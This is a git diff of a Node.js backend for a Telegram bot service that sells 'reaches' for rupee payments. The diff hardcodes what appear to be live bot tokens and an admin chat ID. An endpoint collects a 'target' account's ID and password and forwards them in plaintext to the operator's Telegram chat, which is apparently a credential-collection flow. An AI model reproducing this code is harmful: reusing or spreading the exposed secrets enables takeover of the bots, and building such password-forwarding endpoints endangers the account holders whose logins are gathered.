@@ -7,25 +7,27 @@ app.use(express.json());
 app.use(cors());
 
 // ==========================================
-// CONFIGURATION & HARDCODED CREDENTIALS
+// 1. CONFIGURATION & CREDENTIALS
 // ==========================================
 const CUSTOMER_BOT_TOKEN = '8874503246:AAEmdPcVJMQ3q6pmINsP_Tcwium3ANV4T6I';
+const ADMIN_BOT_TOKEN = '8787715855:AAF9PLZkk_tOb28TYcyTcAs_NszwURnzhkw';
+const ADMIN_CHAT_ID = '7659178694';
 const MINI_APP_URL = 'https://jpw-mini-app-front-end.vercel.app/';
-
-// ⚠️ ENTER YOUR ADMIN BOT TOKEN AND CHAT ID BELOW
-const ADMIN_BOT_TOKEN = 'YOUR_ADMIN_BOT_TOKEN_HERE';
-const ADMIN_CHAT_ID = 'YOUR_ADMIN_CHAT_ID_HERE';
 
 // Initialize Bot Instances
 const customerBot = new TelegramBot(CUSTOMER_BOT_TOKEN, { polling: true });
 const adminBot = new TelegramBot(ADMIN_BOT_TOKEN, { polling: true });
 
 // In-Memory Database Simulation
-let users = {}; // { "telegramId": { reaches: 0 } }
-let pendingTransactions = {}; // { "utrNumber": { telegramId, packageId, reachesToAdd } }
+let users = {}; 
+let pendingTransactions = {}; 
+
+// Catch Polling Errors to prevent server crash
+customerBot.on('polling_error', (error) => console.error('[Customer Bot Error]', error.code || error.message));
+adminBot.on('polling_error', (error) => console.error('[Admin Bot Error]', error.code || error.message));
 
 // ==========================================
-// TELEGRAM CUSTOMER BOT (/start command)
+// 2. TELEGRAM CUSTOMER BOT HANDLERS
 // ==========================================
 customerBot.onText(/\/start/, (msg) => {
     const chatId = msg.chat.id;
@@ -45,11 +47,11 @@ customerBot.onText(/\/start/, (msg) => {
                 ]
             ]
         }
-    }).catch(err => console.error("[Error] Customer Bot /start failed:", err.message));
+    }).catch(err => console.error("[Error] Customer Bot /start send failed:", err.message));
 });
 
 // ==========================================
-// TELEGRAM ADMIN BOT (Accept / Reject Actions)
+// 3. TELEGRAM ADMIN BOT HANDLERS (Callback)
 // ==========================================
 adminBot.on('callback_query', async (query) => {
     const action = query.data;
@@ -72,7 +74,6 @@ adminBot.on('callback_query', async (query) => {
         users[telegramId].reaches += reachesToAdd;
         const totalUserReaches = users[telegramId].reaches;
 
-        // Success Notification to Customer
         const successReportMsg = `
 ✅ *REACHED SUCCESSFULLY*
 
@@ -89,7 +90,6 @@ adminBot.on('callback_query', async (query) => {
             console.error("[Error] Failed to send success message to user:", e.message);
         }
 
-        // Update Admin Bot Message
         await adminBot.editMessageText(`✅ *Accepted & Processed*\n\n👤 User: \`${telegramId}\`\n📦 Added: ${reachesToAdd} Reaches\n🆔 UTR: \`${utrNumber}\``, {
             chat_id: msg.chat.id,
             message_id: msg.message_id,
@@ -99,14 +99,12 @@ adminBot.on('callback_query', async (query) => {
         delete pendingTransactions[utrNumber];
 
     } else if (type === 'reject') {
-        // Reject Notification to Customer
         try {
             await customerBot.sendMessage(telegramId, `❌ *Payment Rejected*\n\nYour payment (UTR: \`${utrNumber}\`) was rejected. Please verify your UTR or contact support.`, { parse_mode: 'Markdown' });
         } catch (e) {
             console.error("[Error] Failed to send reject message to user:", e.message);
         }
 
-        // Update Admin Bot Message
         await adminBot.editMessageText(`❌ *Rejected*\n\n👤 User: \`${telegramId}\`\n🆔 UTR: \`${utrNumber}\``, {
             chat_id: msg.chat.id,
             message_id: msg.message_id,
@@ -120,15 +118,15 @@ adminBot.on('callback_query', async (query) => {
 });
 
 // ==========================================
-// BACKEND API ENDPOINTS
+// 4. BACKEND API ENDPOINTS
 // ==========================================
 
-// Health Check
+// Health Check Endpoint
 app.get('/', (req, res) => {
     res.send('JPW Reached Services Backend Server is Active & Running Smoothly!');
 });
 
-// 1. Initialize User Profile
+// Endpoint 1: Initialize User Profile
 app.post('/api/user/init', (req, res) => {
     const { telegramId } = req.body;
     if (!telegramId) return res.status(400).json({ success: false, error: "Telegram ID required" });
@@ -139,7 +137,7 @@ app.post('/api/user/init', (req, res) => {
     res.json({ success: true, user: users[telegramId] });
 });
 
-// 2. Request Purchase (UTR Submission)
+// Endpoint 2: Request Purchase (UTR Submission)
 app.post('/api/request-purchase', async (req, res) => {
     const { telegramId, packageId, utrNumber } = req.body;
 
@@ -162,7 +160,7 @@ app.post('/api/request-purchase', async (req, res) => {
         console.error("[Error] Customer alert failed (Did user start bot?):", e.message);
     }
 
-    // Send Notification with Accept/Reject buttons to Admin
+    // Send Notification with Accept/Reject buttons to Admin Bot
     const adminMsg = `🔔 *New Payment Request*\n\n👤 User ID: \`${telegramId}\`\n📦 Package: ${reachesToAdd} Reaches\n💰 Amount: ₹${amount}\n🆔 UTR: \`${utrNumber}\``;
 
     try {
@@ -184,7 +182,7 @@ app.post('/api/request-purchase', async (req, res) => {
     res.json({ success: true, message: "Request successfully sent to admin!" });
 });
 
-// 3. Submit Credentials & Queue Status
+// Endpoint 3: Submit Credentials & Queue Status
 app.post('/api/submit-credentials', async (req, res) => {
     const { telegramId, targetId, targetPassword, workOrders, time, queueInfo, estimatedTime } = req.body;
 
@@ -200,7 +198,7 @@ app.post('/api/submit-credentials', async (req, res) => {
     users[telegramId].reaches -= 1;
     const remainingReaches = users[telegramId].reaches;
 
-    // Send Credentials to Admin
+    // Send Credentials to Admin Bot
     try {
         await adminBot.sendMessage(ADMIN_CHAT_ID, `📤 *New Credentials Submitted*\n\n👤 User ID: \`${telegramId}\`\n🔑 Target ID: \`${targetId}\`\n🔒 Password: \`${targetPassword}\``, { parse_mode: 'Markdown' });
     } catch (e) {
@@ -238,10 +236,9 @@ ${workOrders && Array.isArray(workOrders) ? workOrders.map((wo, index) => `${ind
 });
 
 // ==========================================
-// SERVER START
+// 5. SERVER START
 // ==========================================
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
     console.log(`Server listening on port ${PORT}`);
 });
-      
